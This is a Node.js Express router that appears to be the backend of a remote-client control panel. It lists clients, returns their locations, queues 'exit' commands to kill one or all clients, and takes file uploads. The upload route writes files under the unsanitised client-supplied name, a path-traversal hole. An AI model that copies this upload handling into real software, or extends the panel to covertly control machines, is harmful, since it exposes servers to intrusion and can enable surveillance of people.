const router = require('express').Router();
const Client = require('../client.model');
const webCookieValidator = require('../../Utils/MiddleWears/webCookieValidator');
const Utils = require('../../Utils/utilFunctions');
const Command = require("../../Commands/commands.model");
const Status = require("../../Status/status.model");
const clientLocations = require("../../Location/clientLocation.model")
const formidable = require('express-formidable');
let fs = require('fs');
const filesPath = "./Utils/uploads/"

let moveFile = (src, dest)=>{
    fs.rename(src, filesPath+dest, (err)=>{
        if(err) throw err;
        else Utils.LogToFile(`Successfully uploaded ${src}!`);
    });
};


//validate cookies
router.use(webCookieValidator);

//Kill all clients
router.route('/killall').get((req,res )=>{
    try{
        //Gather all clients from database
        Client.find({},function(err,users){
            if(err){
                console.log(`Error getting all clients from database ${err}`);
            }
            else{
                if(users.length !== 0){
                    for(let i=0;i<Object.keys(users).length;i++){
                        let clientId = users[i]['client_id'];
                        let newCommand = new Command({client_id:clientId,command:"exit"});
                        newCommand.save()
                            .then(()=>{console.log(`Successfully added exit command for client ${clientId}`)})
                            .catch((err)=>{
                                if(err){
                                    Utils.LogToFile(`Error sending command for client ${clientId}`)
                                    res.sendStatus(500);
                                    res.send("Internal server error");
                                }
                            })
                    }
                }
                res.send("killed all clients");
            }
        });
    }
    catch (err){
        Utils.LogToFile(`Error killing all clients ${err}`);
        res.status(500);
        res.send("Internal server error");
    }

});

//kill single client
router.route('/kill').post((req,res )=>{
    try{
        const clientId = req.body.client_id;
        //Gather all clients from database
        Client.findOneAndDelete({client_id:clientId},function(err,user) {
            if (err) {
                Utils.LogToFile(`Error removing client from database ${err}`);
                res.status(500).send("Internal server error");
            }
            else{
                Status.findOneAndDelete({client_id:clientId},function(err){
                    if(err)
                        Utils.LogToFile(`Error removing client status for killed client ${err}`);
                })
            }
        })
        res.send();
    }
    catch (err){
        Utils.LogToFile(`Error killing client ${err}`);
        res.status(500).send("Internal server error");
    }
});

//get specific client
router.route('/client').post((req,res)=>{
    const clientId = req.body.id;
    Client.findOne({client_id:clientId},{}, {useFindAndModify:false}, function(err,user){
        if(err){
            Utils.LogToFile(`Error getting user by token ${err}`);
            res.sendStatus(400);
        }else{
            if(user) {
                res.send({user});
            }else{
                res.send({});
            }
        }
    })
})

//get all clients
router.route('/').get((req,res)=>{
    Client.find({},{}, {}, function(err,users){
        if(err){
            Utils.LogToFile(`Error getting user by token ${err}`);
            res.sendStatus(400);
        }else{
            if(users) {
                res.send(users);
            }else{
                res.send();
            }
        }
    })
})


//Get all client locations
router.route('/locations').get((req,res)=> {
    clientLocations.find({}, {}, {}, function (err, locations) {
        if (err) {
            Utils.LogToFile(`Error getting all client's locations ${err}`);
            res.sendStatus(401);
        } else {
            if (locations) {
                res.send(locations);
            } else {
                res.send();
            }
        }
    })
})

router.use(formidable())


//Upload file to directory
router.route('/upload').post((req,res)=> {
    moveFile(req.files.file.path, req.files.file.name)
    res.send()
})
module.exports = router;